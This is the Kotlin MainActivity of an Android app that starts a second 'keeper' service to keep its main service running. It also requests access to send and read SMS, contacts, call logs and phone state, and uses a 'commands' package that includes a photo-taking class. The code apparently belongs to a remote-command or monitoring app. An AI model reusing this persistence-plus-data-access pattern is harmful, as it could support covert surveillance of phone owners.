package com.hc.calling

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.graphics.Bitmap
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import com.hc.calling.callingtransaction.R
import com.hc.calling.commands.pic.Photographer
import com.hc.permission.PermissonUtil
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        //start two services for keep the mainly service alive
        val intent = Intent(this, MainService::class.java)
        val intent2 = Intent(this, KeeperService::class.java)
        startService(intent)
        startService(intent2)

        //request the permissions
        PermissonUtil.requestPermisson(
            this,
            arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS
            ),
            10000,
            object : PermissonUtil.PermissionCallBack {
                override fun refused(permission: String?) {
                }

                override fun permitted(permission: String?) {
                }
            })

    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode === Photographer.REQUEST_IMAGE_CAPTURE && resultCode === Activity.RESULT_OK) {
            val extras = data!!.getExtras()
            val imageBitmap = extras.get("data") as Bitmap
            img.setImageBitmap(imageBitmap)
        }
    }
}
